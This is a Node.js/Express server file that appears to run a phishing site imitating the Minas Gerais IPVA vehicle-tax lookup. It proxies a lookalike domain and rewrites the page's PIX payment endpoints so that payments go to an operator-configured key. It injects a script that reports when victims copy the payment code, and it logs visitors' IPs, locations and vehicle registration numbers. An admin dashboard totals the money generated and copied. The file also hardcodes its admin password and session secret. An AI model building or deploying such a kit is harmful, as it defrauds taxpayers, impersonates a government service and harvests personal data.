const express = require('express');
const session = require('express-session');
const axios = require('axios');
const { CookieJar } = require('tough-cookie');
const { wrapper } = require('axios-cookiejar-support');
const path = require('path');
const fs = require('fs');
const QRCode = require('qrcode');
const { payload } = require('pix-payload');

const app = express();
const PORT = process.env.PORT || 3000;  // <<--- ÚNICA MUDANÇA AQUI

// 1. Confiar no proxy (para obter IP real do cliente)
app.set('trust proxy', true);

app.use(session({
    secret: 'segredo-super-secreto',
    resave: false,
    saveUninitialized: true,
    cookie: { secure: false }
}));

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static(__dirname));

const DB_PATH = path.join(__dirname, 'database.json');

function lerDB() {
    try {
        return JSON.parse(fs.readFileSync(DB_PATH, 'utf8'));
    } catch (e) {
        return {
            clicks: [],
            consultas: [],
            pix_gerados: [],
            config: { pix: { nome: '', cidade: '', identificador: '', chave: '' } }
        };
    }
}

function salvarDB(data) {
    fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
}

async function getCidadeFromIP(ip) {
    try {
        if (ip === '::1' || ip === '127.0.0.1' || ip === 'localhost') return 'Localhost';
        const response = await axios.get(`https://ipapi.co/${ip}/json/`, { timeout: 3000 });
        if (response.data && response.data.city) {
            return `${response.data.city} - ${response.data.region_code}`;
        }
        return 'Desconhecida';
    } catch (error) {
        return 'Desconhecida';
    }
}

function authMiddleware(req, res, next) {
    if (req.session && req.session.loggedIn) next();
    else res.status(401).json({ erro: 'Não autorizado' });
}

// Rota inicial (registra clique)
app.get('/', (req, res) => {
    const db = lerDB();
    db.clicks.push({
        timestamp: new Date().toISOString(),
        ip: req.ip,
        userAgent: req.headers['user-agent']
    });
    salvarDB(db);
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Proxy de consulta
app.post('/api/consultar', async (req, res) => {
    const { renavam, ano } = req.body;
    if (!renavam || !ano) return res.status(400).send('Renavam e ano são obrigatórios');

    const jar = new CookieJar();
    const client = wrapper(axios.create({ jar, withCredentials: true }));

    try {
        await client.post(
            'https://acesso-sfz-minasgerais.com/detran/ipva/consultar/',
            `renavam=${renavam}&ano=${ano}`,
            {
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'Accept': 'application/json, text/javascript, */*; q=0.01',
                    'X-Requested-With': 'XMLHttpRequest',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
                    'Referer': 'https://acesso-sfz-minasgerais.com/fazenda/detran/ipva/',
                    'Origin': 'https://acesso-sfz-minasgerais.com',
                },
            }
        );

        const urlResultados = `https://acesso-sfz-minasgerais.com/fazenda/detran/consulta/debitos/${renavam}/${ano}`;
        const response = await client.get(urlResultados, {
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
                'Referer': 'https://acesso-sfz-minasgerais.com/fazenda/detran/ipva/',
            },
        });

        let html = response.data;

        // Obtém cidade do IP real
        const cidade = await getCidadeFromIP(req.ip);
        const db = lerDB();
        db.consultas.push({
            renavam,
            ano,
            cidade,
            timestamp: new Date().toISOString(),
            ip: req.ip,
            userAgent: req.headers['user-agent']
        });
        salvarDB(db);

        // Reescreve URLs para absolutas
        html = html.replace(/(src|href)="\/(assets|_next|fazenda)/g, 'https://acesso-sfz-minasgerais.com/$2');
        html = html.replace(/srcset="\/(assets|_next|fazenda)/g, 'srcset="https://acesso-sfz-minasgerais.com/$1');
        html = html.replace(/window\.location\.href=['"]\/fazenda\/detran\/ipva\/['"]/g, "window.location.href='/'");
        html = html.replace(/src="\/assets\/fazenda\/iconHeaderHome\./g, 'src="https://acesso-sfz-minasgerais.com/assets/fazenda/iconHeaderHome.');
        html = html.replace(/src="\/assets\/fazenda\/iconHeaderCar\./g, 'src="https://acesso-sfz-minasgerais.com/assets/fazenda/iconHeaderCar.');
        html = html.replace(/\/detran\/debitos\/pix\/emissao\//g, '/api/gerar-pix');
        html = html.replace(/\/detran\/debitos\/pix\/emitir\//g, '/api/gerar-pix');

        // Script para monitorar cópia do PIX (com correções)
        const scriptMonitor = `
        <script>
            let ultimoPixId = null;
            const originalOpenPixModal = window.openPixModal;
            window.openPixModal = function() {
                if (originalOpenPixModal) originalOpenPixModal.apply(this, arguments);
                const originalPost = $.post;
                $.post = function(url, data, callback, type) {
                    if (url === '/api/gerar-pix') {
                        return originalPost(url, data, function(resp) {
                            if (resp && resp.pixId) {
                                ultimoPixId = resp.pixId;
                            }
                            if (callback) callback(resp);
                        }, type);
                    } else {
                        return originalPost(url, data, callback, type);
                    }
                };
            };

            // Listener para botão de copiar com prevenção de duplicação
            $(document).on('click', '.copyBtn, #copyBtn, .btn-copy', function(e) {
                e.preventDefault();      // Impede comportamento padrão
                e.stopPropagation();     // Impede propagação para outros eventos
                var payload = $('#pixCodigo').val() || $('textarea.pix-codigo').val() || '';
                if (ultimoPixId) {
                    $.post('/api/registrar-copia-pix', { pixId: ultimoPixId });
                } else if (payload) {
                    $.post('/api/registrar-copia-pix', { payload: payload });
                }
            });
        </script>
        `;
        html = html.replace('</body>', scriptMonitor + '</body>');

        res.set('Content-Type', 'text/html');
        res.send(html);

    } catch (error) {
        console.error('Erro no proxy:', error.message);
        res.status(500).send('Erro ao processar a consulta. Tente novamente.');
    }
});

// Gerar PIX
app.post('/api/gerar-pix', (req, res) => {
    const { placa, valor, debitos } = req.body;
    const db = lerDB();
    const chavePix = db.config.pix.chave;
    const nome = db.config.pix.nome;
    const cidade = db.config.pix.cidade;
    const identificador = db.config.pix.identificador;

    if (!chavePix || !nome || !cidade) {
        return res.status(400).json({ erro: 'Chave PIX, nome e cidade são obrigatórios. Configure-os no painel admin.' });
    }

    try {
        const dadosPix = {
            key: chavePix,
            name: nome,
            city: cidade,
            amount: parseFloat(valor),
            transactionId: identificador || '***'
        };
        if (!dadosPix.amount || isNaN(dadosPix.amount)) delete dadosPix.amount;

        const payloadPix = payload(dadosPix);

        QRCode.toDataURL(payloadPix, (err, qrcode) => {
            if (err) {
                console.error('Erro ao gerar QR code:', err);
                return res.status(500).json({ erro: 'Erro ao gerar QR code' });
            }

            const pixId = Date.now() + '-' + Math.random().toString(36).substring(2, 10);

            // 2. Salvar o payload (copiacola) no banco de dados
            db.pix_gerados.push({
                id: pixId,
                renavam: placa,
                valor: parseFloat(valor),
                debitos,
                copiacola: payloadPix,   // <<--- ESSENCIAL
                timestamp: new Date().toISOString(),
                ip: req.ip,
                userAgent: req.headers['user-agent'],
                copiado: false
            });
            salvarDB(db);

            res.json({
                status: 'ok',
                qrcode: qrcode,
                copiacola: payloadPix,
                pixId: pixId
            });
        });

    } catch (error) {
        console.error('Erro na geração do payload PIX:', error.message);
        res.status(500).json({ erro: 'Erro ao gerar payload PIX. Verifique os dados da chave.' });
    }
});

// Registrar cópia do PIX
app.post('/api/registrar-copia-pix', (req, res) => {
    const { pixId, payload } = req.body;
    const db = lerDB();
    let pix = null;

    if (pixId) {
        pix = db.pix_gerados.find(p => p.id === pixId);
    } else if (payload) {
        pix = db.pix_gerados.find(p => p.copiacola === payload);
    }

    if (pix && !pix.copiado) {
        pix.copiado = true;
        pix.copiadoEm = new Date().toISOString();
        salvarDB(db);
        return res.json({ success: true });
    }
    res.json({ success: false, motivo: 'PIX não encontrado ou já copiado' });
});

// Admin login
app.post('/api/admin/login', (req, res) => {
    const { username, password } = req.body;
    if (username === 'admin' && password === 'dg2026') {
        req.session.loggedIn = true;
        res.json({ success: true });
    } else {
        res.status(401).json({ erro: 'Credenciais inválidas' });
    }
});

app.post('/api/admin/logout', (req, res) => {
    req.session.destroy();
    res.json({ success: true });
});

// Rotas protegidas do admin
app.get('/admin.html', authMiddleware, (req, res) => {
    res.sendFile(path.join(__dirname, 'admin.html'));
});

// Dashboard com três variáveis
app.get('/api/admin/dashboard', authMiddleware, (req, res) => {
    const db = lerDB();

    const totalClicks = db.clicks.length;
    const totalConsultas = db.consultas.length;

    // Soma de TODOS os valores de PIX (gerados)
    const valorTotalGerado = db.pix_gerados.reduce((acc, p) => acc + (parseFloat(p.valor) || 0), 0);

    // Filtra apenas os PIX copiados
    const pixCopiados = db.pix_gerados.filter(p => p.copiado === true);

    // Soma dos valores dos PIX copiados
    const valorTotalCopiado = pixCopiados.reduce((acc, p) => acc + (parseFloat(p.valor) || 0), 0);

    // Quantidade de PIX copiados
    const totalPixCopiados = pixCopiados.length;

    res.json({
        totalClicks,
        totalConsultas,
        valorTotalGerado,
        valorTotalCopiado,
        totalPixCopiados
    });
});

// Demais rotas de logs e configurações (inalteradas)
app.get('/api/admin/logs/clicks', authMiddleware, (req, res) => {
    const db = lerDB();
    res.json(db.clicks.slice(-100).reverse());
});

app.get('/api/admin/logs/consultas', authMiddleware, (req, res) => {
    const db = lerDB();
    res.json(db.consultas.slice(-100).reverse());
});

app.get('/api/admin/logs/pix', authMiddleware, (req, res) => {
    const db = lerDB();
    const lista = db.pix_gerados.slice(-100).reverse().map(p => ({
        ...p,
        copiado: p.copiado || false
    }));
    res.json(lista);
});

app.get('/api/admin/config/pix', authMiddleware, (req, res) => {
    const db = lerDB();
    res.json(db.config.pix);
});

app.post('/api/admin/config/pix', authMiddleware, (req, res) => {
    const { nome, cidade, identificador, chave } = req.body;
    const db = lerDB();
    db.config.pix = { nome, cidade, identificador, chave };
    salvarDB(db);
    res.json({ success: true });
});

app.post('/api/admin/clear-logs', authMiddleware, (req, res) => {
    const db = lerDB();
    db.clicks = [];
    db.consultas = [];
    db.pix_gerados = [];
    salvarDB(db);
    res.json({ success: true });
});

app.listen(PORT, '0.0.0.0', () => {  // <<--- ÚNICA MUDANÇA AQUI TAMBÉM
    console.log(`Servidor rodando na porta ${PORT}`);
    if (!fs.existsSync(DB_PATH)) {
        salvarDB({
            clicks: [],
            consultas: [],
            pix_gerados: [],
            config: { pix: { nome: '', cidade: '', identificador: '', chave: '' } }
        });
    }
});
